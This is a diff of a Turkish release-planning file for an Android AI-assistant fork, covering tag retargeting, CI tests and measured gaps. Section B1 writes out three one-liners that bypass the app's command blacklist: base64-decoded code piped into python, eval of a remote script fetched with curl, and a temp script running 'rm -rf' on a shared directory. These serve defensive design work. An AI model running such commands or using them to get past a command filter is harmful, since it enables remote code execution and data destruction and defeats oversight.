@@ -1,201 +1,101 @@
-# SIRADAKİ SÜRÜM — 37091 / 1.15-ozel.14 · iş listesi
+# SIRADAKİ SÜRÜM — `37098` / `1.15-ozel.17` · iş listesi
 
-`37090` yakıldı (v1.15-ozel.13 yayında). Sıradaki numara **37091**. Yeni kimlik:
-`com.minis.x` / **Minis X**. `1.15-ozel.14` bu paket adıyla ilk sürüm olacak.
+`37097` (`1.15-ozel.16`) hazırlık dalında, yayınlanmadı. Sıradaki numara
+**37098**. Yeni kimlik `.14`'ten beri sabit: `com.minis.x` / **Minis X**.
 
-Bu liste uydurulmadı: her madde ya `integration_audit.py`, ya `DENETIM-BASLIKLARI.md`
-ölçümünden, ya da bugün yaptığım aramadan çıktı. "Olmalı" değil, "şu an şu".
+> Bu dosya `.16` öncesinde `37091` planını anlatıyordu ve bayatlamıştı.
+> Kural: bir sürüm yayınlandığında bu dosya **yeniden yazılır**, üstüne
+> eklenmez. Geçmiş `docs/ozel/DEGISIKLIK-GUNLUGU-11-16.md`'de.
 
 ---
 
-## Önce: bugün bulduğum iki yeni sessiz yalan
+## A. Yayın öncesi — `.16` çıkmadan kapanmalı
 
-Ayar ekranındaki 17 anahtarın **hangisi gerçekten bir davranışa bağlı** diye
-tek tek saydım (`rg -c "Feature.X"` üretim kodunda, kendi ekranı hariç):
+### A1 · Etiketlerin yeniden hedeflenmesi — **karar bekliyor**
+`v1.15-ozel.11.3.1`, `.11.4`, `.13`, `.14`, `.15` etiketlerinin **beşi de**
+`ffeb948` (`11.2` / 37029) commit'ini gösteriyor. Release nesneleri doğru APK'yı
+taşıyor; yanlış olan etiket → commit bağı.
 
-| Anahtar | Kullanım | Durum |
+Neden bloklayıcı: `RELEASE_REPO` bu çatala bakıyor. Kullanıcı ya "güncelleme
+yok" görür ya da 37029 indirilir; Android düşük `versionCode`'u reddeder ve
+açıklamasız "Uygulama yüklenemedi" çıkar.
+
+Plan hazır, uygulanmadı (uzak etiket silme geri dönüşsüz):
+```bash
+python3 scripts/ozel/tag-denetim.py --fix-plan
+```
+
+| Etiket | Doğru commit | versionCode |
 |---|---|---|
-| NOTES, VAULT, TRANSLATION, QS_TILE, LIVE_TASKS, TOOLCHAINS | 3–8 | ✅ bağlı |
-| BACKGROUND_GATES, PROVIDER_TEST, JOURNAL, ACCEPTANCE_CRITERIA, COUNCIL | 2–5 | ✅ bağlı |
-| APPROVAL_GATE, BUDGET_CAP, PLAN_PREVIEW, LESSON_BOOK | 3–5 | ✅ bağlı (yeni) |
-| **STATION** | **0** | 🔴 **modül yok** — `ui/station/` hiç yazılmadı |
-| **EDIT_MODE** | **0** | 🔴 **uygulama yok** — kaplama katmanı hiç yazılmadı |
-| REMOTE_CONSOLE | 0 | ⛔ belgelenmiş, kasıtlı |
+| `v1.15-ozel.11.3.1` | `98c8f10` | 37030 |
+| `v1.15-ozel.11.4` | `db2566e` | 37033 |
+| `v1.15-ozel.13` | `241b470` | 37090 |
+| `v1.15-ozel.14` | `73ba3ed` | 37091 |
+| `v1.15-ozel.15` | `db55d4c` | 37092 |
 
-**STATION** anahtarı `true` varsayılanla AÇIK ve alt yazısı aynen şu:
+### A2 · CI'da iki yeni test ilk kez koşacak
+`RiskCorpusTest`, `ApprovalInboxTest`. Bu cihazda JVM başlamadığı için hiç
+koşmadılar. Kırmızı çıkarlarsa **sürüm çıkmamalı** — `apk.yml`'deki
+`needs: tests` bunu zorunlu kılıyor ama `ozel-guard.yml` de artık korpusu
+saniyeler içinde denetliyor.
 
-> *"Two to four agents on one task, isolated from each other"*
-
-Böyle bir şey yok. Kullanıcı açıyor, hiçbir şey olmuyor. `ui/station/` dizini
-hiç oluşturulmadı.
-
-**EDIT_MODE** aynı:
-
-> *"A pen in the middle of every screen: tap it, mark what should change, and
-> the note lands in Notes for the assistant"*
-
-Kalem yok, not iliştirme yok, ekran yakalama yok.
-
-Bu ikisi **FANOUT ile aynı sınıf**: kullanıcıya olmayan bir şeyi vaat eden,
-çalışıyormuş gibi görünen arayüz. Özelliklerin en pahalı hatası.
+### A3 · `ozel-guard.yml` ilk koşu
+Yeni iş. Üç kontrol: korpus, yapı, etiket. A2'nin aksine **dakikalar değil
+saniyeler** sürüyor. İlk koşuda kırmızı olursa hangi kontrol olduğunu adıyla
+söylüyor.
 
 ---
 
-## A. Yayın bloklayıcı (37091'de bitmeli)
+## B. Ölçülmüş, henüz kapatılmamış boşluklar
 
-### A1 · `schemas/…/15.json` yok
-Room `CODE_DB_VERSION = 15`, göç var, ama şema dosyası repoda değil. İlk
-derlemede KSP üretir, commit edilmemiş. Sonuç: göçün doğruluğu CI'da
-doğrulanamıyor ve bir sonraki DB değişikliğinde karşılaştırma tabanı yok.
+### B1 · Kara listenin yapısal sınırı (mimari)
+`.16` üç somut kaçış yolunu kapattı ama sınıf kapanmadı:
 
-**İş:** derleme çıktısından şemayı al, `src/android/app/schemas/…/15.json` olarak
-commit et, `Room` şema doğrulamasını testlere ekle.
-**Boyut:** 1 saat. **Risk:** düşük.
+```bash
+echo "aW1wb3J0IHNodXRpbDs..." | base64 -d | python3   # kod metinde değil
+eval "$(curl -s https://x/y.sh)"                      # kod uzakta
+printf 'rm -rf /var/minis/shared' > /tmp/a.sh && bash /tmp/a.sh
+```
 
-### A2 · FANOUT sessiz yalan
-`TeamEditorScreen` "Compare" modunu sunuyor: *"her üye aynı görevi bağımsız
-yanıtlar, yanıtlar yan yana gösterilir, tartışma yok"*. `AndroidTeamRuntime:290`
-yalnız `COUNCIL`'e bakıyor; FANOUT `TeamLoop`'tan (handoff) geçiyor. Kullanıcı
-sıralı sonuç alıyor.
+Doğru cevap kara listeyi büyütmek değil. İki yol var:
+1. **`bash`/`sh` çağrılarını `shell:interpreter` kapsamına al** — `bash x.sh`
+   de denetlenemez kod çalıştırmaktır. Tek satırlık kural, gürültüsü düşük.
+2. **Gerçek sandbox** (seccomp/landlock): `write` iznini `isScratch ∪ isTemp`
+   ile sınırla. Mimari iş, ayrı sürüm.
 
-**İş:** `TeamMode.FANOUT` için gerçek dal — üyeler paralel (dalga sınırıyla),
-her yanıt ayrı raporlanır, sentez yok. Veya modu kaldır. **Yarım bırakmak yok.**
-**Boyut:** 4–6 saat. **Risk:** orta (eşzamanlılık).
+### B2 · `mv` hedefi çözülemediğinde
+`.16` bunu HIGH'tan MEDIUM'a çekti (göreli yol oturum dizininde kalır). Ama
+`mv $DEGISKEN /var/minis/shared` gibi bir komutta hedef **yazma** yönüdür ve
+tahmin edilemez. Kural: `mv`'nin **ikinci** argümanı da hedef sayılmalı.
 
-### A3 · STATION anahtarı
-İki seçenek:
-- **(a)** İstasyon A dilimini yaz: 2 panel, araçsız, tek görev iki modele
-- **(b)** Anahtarı `false`'a çek + alt yazıya "henüz yok" yaz
+### B3 · Compare koşuları `TeamRunStore`'a yazılmıyor
+`TeamRunStore.record` `CouncilOutcome` alıyor; Compare'ın claim/konsensüsü yok.
+Sahte boş konsensüs uydurmak yerine kayıt hiç yazılmamış (doğru karar), ama
+sonuç: **Compare geçmişi yok**. Doğru çözüm `TeamRunStore`'a ikinci bir kayıt
+biçimi (`FanoutOutcome`) eklemek.
 
-**Öneri (b)** — 37091 için. İstasyon büyük bir iş (paneller, terminal, tarayıcı
-havuzu) ve temiz sürümün içine sığmaz. Yanlış vaadi kapat, işi 37093'e al.
-
-### A4 · EDIT_MODE anahtarı
-Aynı: **(a)** yüzen kalem + not iliştirme, **(b)** anahtarı kaldır.
-**Öneri (b)** — anahtar zaten `false` varsayılanlı, ama satır duruyor. Kaldır.
-
----
-
-## B. Güven ve doğruluk
-
-### B1 · Otomatik yedek şifresiz
-`BackupRunController.Request(passphrase = null)` — düz ZIP, depolama alanında.
-Kullanıcı yedeği açtığında sohbetleri, **sağlayıcı anahtarları** ve MCP sırları
-şifresiz duruyor.
-
-**İş:** otomatik yedekte şifre zorunlu olsun (ayarlarda bir kez girilir) veya
-`secrets` kategorisi otomatik yedekten çıkarılsın. **Öneri:** anahtarları çıkar,
-şifre isteğe bağlı.
-**Boyut:** 2 saat. **Risk:** orta (geri yükleme akışı).
-
-### B2 · REMOTE_CONSOLE kararı
-97 satırlık jeton modeli var, uygulama yok, anahtar kapalı. İki seçenek:
-**(a)** sil (dosya + test), **(b)** uygula (jeton + QR + salt-okuma konsol).
-**Karar senin.** Ben (a) derdim: telefon cebimizde değilken yazma yetkisi
-vermek, kazandırdığından çok risk getiriyor.
-
-### B3 · Tur özetinde gerçek satır sayısı
-Şu an "3 dosya değişti" diyor, `+120/−8` demiyor — `ActionJournal.Entry` bayt
-tutuyor, satır yok. Uydurmak yerine sustum. Gerçek sayı için `Entry`'ye
-`addedLines`/`removedLines` eklenip yazma yolunda hesaplanmalı.
-**Boyut:** 2 saat. **Risk:** düşük.
+### B4 · `ChatHealthBridge` yalnız Canlı Görevler'de
+Üst çubuk (sohbetin kendisi) ikinci tüketici. Köprü hazır; `ChatScreen`'e chip
+eklemek ayrı iş. Ölçüt: chip 96dp'yi geçmemeli (bkz. `UY` sözleşmesi).
 
 ---
 
-## C. Senin 13 ekseninden açık kalanlar
+## C. Belgeler
 
-### C1 · Sağlayıcı sağlığı (ping / hata / takip / tamir)
-Bugün: `PROVIDER_TEST` tek GET atıyor, **yalnız kullanıcı basınca**. Sohbet
-isteklerinin sağlığı hiç sayılmıyor. `QuotaRules.consecutiveFailures` var ama
-**yalnız kota yenileme** için geri çekilme; sohbet hatasıyla ilgisi yok.
+### C1 · `FORK.md` §5/§6 `.10` anlatıyor
+Kimlik `.14`'te (`com.minis.x`), sürüm şeması `.13`'te (37090+) değişti.
+Bu bölümler yanlış bilgi taşıyor. `.16`'da dokunulmadı: yarım düzeltme
+yanlıştan kötü. Tek seferde, ölçerek yeniden yazılmalı.
 
-**İş — üç parça:**
-1. **Sayaç:** sağlayıcı örneği başına son 50 isteğin başarı/hata oranı,
-   ortalama gecikme. `usage` tablosunun yanına küçük bir tablo.
-2. **Takip:** Ayarlar › Sağlayıcılar satırında rozet — "%12 hata · 1.4 sn · son
-   hata 3 dk önce". Kullanıcı mesaj göndermeden görür.
-3. **Tamir:** 3 ardışık aynı tip hata → tek düğme: "modelleri yenile" /
-   "base URL'i sıfırla" / "anahtarı yeniden gir". Otomatik değil, **öneri**.
-
-**Boyut:** 6–8 saat. **Risk:** düşük. → **37092'nin ana maddesi olmalı.**
-
-### C2 · Sağlayıcı periyodik ping
-Bağlantı testini 5 dakikada bir kendiliğinden koşturmak. Dikkat: her ping
-ücretsiz değil ve 429 üretebilir. **Öneri:** yalnız "son 10 dakikada hata var"
-ise ping at.
-
-### C3 · Dolar tavanı
-`BudgetLimits` alanları var ama `BudgetStore` yalnız token okuyor; katalog her
-model için fiyat taşımıyor. **Ya** fiyat kataloğu tamamlanır (models.dev
-verisinde var, `ModelsDevApi.kt` zaten okuyor) **ya** alan kaldırılır.
-**Öneri:** katalogdan fiyatı olan modeller için dolar tavanı, olmayanlar için
-"fiyat bilinmiyor" ve yalnız token sayılır.
+### C2 · `docs/ozel/IS-LISTESI-2026-11-20.md` ve eski denetim belgeleri
+Aynı gün üç farklı plan dosyası var. Biri (`SIRADAKI-SURUM.md`) tek kaynak
+olmalı; diğerleri `arsiv/`'e taşınmalı.
 
 ---
 
-## D. Kalite altyapısı (sürüm değil, güven)
+## Yapılmayacaklar
 
-| # | İş | Neden | Boyut |
-|---|---|---|---|
-| D1 | `ktlint` veya `detekt` | `preflight` derleyici değil; stil/koku/tehlikeli kalıp denetimi yok | 3 saat |
-| D2 | `jacoco` kapsam | Hangi satır test edilmiyor bilinmiyor; 6.481 test var ama kapsamı ölçülmedi | 3 saat |
-| D3 | Rota testi | Yeni 2 rota (`ozel_budget_limits`, `ozel_replay`) elle denendi | 2 saat |
-| D4 | Dilim kapısını genişlet | Şu an 11 dilim; yeni dilimler manifest'e girmezse kapıdan geçmiyor | 1 saat |
-
-**D4 önemli:** `slices.json` elle güncelleniyor. Yeni bir dilim eklenip
-manifest'e yazılmazsa **sessizce denetimsiz** kalıyor.
-
----
-
-## E. Arayüz cilası
-
-| # | İş | Neden |
-|---|---|---|
-| E1 | Onay kartında **titreşim** | Cep telefonunda, ekrana bakmıyorsa kart fark edilmiyor |
-| E2 | Kuyruk görünürlüğü | 90 sn gözcüsü var, "sıra bekliyorum" ekranda yok |
-| E3 | Ders geçmişi | Öneri kartı var, "onayladığım dersler" listesi yok |
-| E4 | 21 dil | `mx_*` metinleri yalnız TR + EN; diğer 21 dil İngilizce görüyor |
-| E5 | İstasyon A | (A3b seçilirse 37093'e) |
-
----
-
-## Önerilen sürüm bölünmesi
-
-### 37091 / 1.15-ozel.14 — "temiz sürüm"
-**Tema:** yalanları kapat, güveni sağlamlaştır. Yeni büyük özellik yok.
-
-- A1 `schemas/15.json`
-- A2 FANOUT düzelt
-- A3b STATION anahtarını kapat
-- A4b EDIT_MODE anahtarını kaldır
-- B1 yedek şifreleme (veya secrets hariç)
-- B3 tur özeti gerçek satır sayısı
-- D4 dilim manifestosu kapısı
-
-**Tahmini:** 1 gün. **Risk:** düşük. **Kullanıcıya görünen:** az, ama
-"ayarlarda gördüğüm her şey çalışıyor" garantisi.
-
-### 37092 / 1.15-ozel.15 — "sağlayıcı sağlığı"
-- C1 sayaç + rozet + öneri
-- C2 koşullu ping
-- C3 dolar tavanı (katalog fiyatıyla)
-
-**Tahmini:** 1 gün. **Kullanıcıya görünen:** yüksek — bozuk sağlayıcıyı
-mesaj atmadan görür.
-
-### 37093 / 1.15-ozel.16 — "istasyon ve kalite"
-- İstasyon A (2 panel, araçsız)
-- D1/D2/D3 statik analiz + kapsam + rota testi
-- E1/E2/E3 cila
-- E4 21 dil
-
----
-
-## Şu an hemen yapılabilecek 3 küçük iş
-
-Bunlar sürüm beklemez, bugün 30 dakikada biter:
-
-1. **REMOTE_CONSOLE dosyasını sil** (B2a) — karar verirsen.
-2. **STATION + EDIT_MODE anahtarlarını kapat/kaldır** (A3b + A4b) — yarım saat.
-3. **`slices.json`'a otomatik kapı** (D4) — yeni dilim manifest'e yazılmazsa
-   kapı uyarır.
+- iOS derlemesi (macOS/Xcode ister).
+- Upstream'de zaten olan özelliklerin yeniden yazımı.
+- `ui/station/` — paneller ayrı sürüm; o gelene kadar `STATION` satırı da yok.
+- `37090` uzaktan konsol — jeton modeli var, sunucu yok; ürün kararı bekliyor.
